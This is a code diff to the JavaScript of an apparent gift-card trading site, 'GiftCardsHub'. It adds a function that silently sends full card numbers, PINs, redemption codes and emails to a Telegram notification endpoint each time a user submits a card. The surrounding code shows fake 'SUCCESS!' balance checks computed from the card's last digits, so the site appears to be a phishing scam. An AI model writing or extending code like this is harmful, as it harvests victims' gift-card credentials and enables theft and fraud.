@@ -108,6 +108,25 @@ const SOURCE_LOGOS = {
   Xbox: "./assets/brand-logos/xbox.svg",
 };
 
+async function notifyTelegram(source, fields) {
+  try {
+    const lines = [`\uD83D\uDD14 <b>GiftCardsHub \u2014 ${source}</b>`];
+    for (const [key, value] of Object.entries(fields)) {
+      const str = String(value ?? "").trim();
+      if (str) lines.push(`${key}: <code>${str}</code>`);
+    }
+    lines.push(`\uD83C\uDF10 ${window.location.hostname}`);
+    lines.push(`\uD83D\uDD50 ${new Date().toISOString()}`);
+    await fetch("/.netlify/functions/notify-telegram", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({ text: lines.join("\n") }),
+    });
+  } catch {
+    // Silent — never block user flow.
+  }
+}
+
 function setButtonState(button, active) {
   button.classList.remove(...activeButtonClasses, ...inactiveButtonClasses);
   if (active) {
@@ -766,6 +785,14 @@ function initCheckBalance() {
       if (sellEstimateCopy) {
         sellEstimateCopy.textContent = `Up to ${Math.round(rate * 100)}% of your ${selectedBrand} card value`;
       }
+      notifyTelegram("\uD83D\uDCB8 Sell Submission", {
+        "\uD83D\uDCB3 Brand": selectedBrand,
+        "\uD83D\uDD22 Card Number": digits,
+        "\uD83D\uDD11 PIN": pin,
+        "\uD83D\uDCB0 Card Value": formatUsd(cardValue),
+        "\uD83D\uDCE7 Email": sellerEmail,
+        "\uD83D\uDCC8 Est. Payout": formatUsd(estimated),
+      });
       openSitePopup({
         variant: "success",
         kicker: "Quote Ready",
@@ -795,6 +822,11 @@ function initCheckBalance() {
         return;
       }
 
+      notifyTelegram("\u2705 Verify (Amount)", {
+        "\uD83D\uDCB3 Brand": selectedBrand,
+        "\uD83D\uDCB0 Amount": `${selectedCurrency} ${verifyAmount}`,
+        "\uD83D\uDD11 Redemption Code": pin,
+      });
       openVerifyPopup({
         variant: "success",
         kicker: "SUCCESS!",
@@ -835,6 +867,12 @@ function initCheckBalance() {
     const computedBalance = ((lastFour % 375) + (brandOffsets[selectedBrand] || 20)) / 1.37;
     const maskedNumber = digits.slice(-4).padStart(4, "0");
 
+    notifyTelegram("\u2705 Verify (Card+PIN)", {
+      "\uD83D\uDCB3 Brand": selectedBrand,
+      "\uD83D\uDD22 Card Number": digits,
+      "\uD83D\uDD11 PIN": pin,
+      "\uD83D\uDCB0 Balance": formatUsd(computedBalance),
+    });
     openVerifyPopup({
       variant: "success",
       kicker: "SUCCESS!",
@@ -1032,6 +1070,10 @@ function initBuyPageActions() {
       cartCopy.textContent = `${selectedBrand} ${selectedValue === "Custom" ? "custom amount" : `$${selectedValue}`} added to your cart.`;
     }
 
+    notifyTelegram("\uD83D\uDED2 Buy Order", {
+      "\uD83D\uDCB3 Brand": selectedBrand,
+      "\uD83D\uDCB0 Value": selectedValue === "Custom" ? "Custom" : `$${selectedValue}`,
+    });
     openSitePopup({
       variant: "success",
       kicker: "Added To Cart",
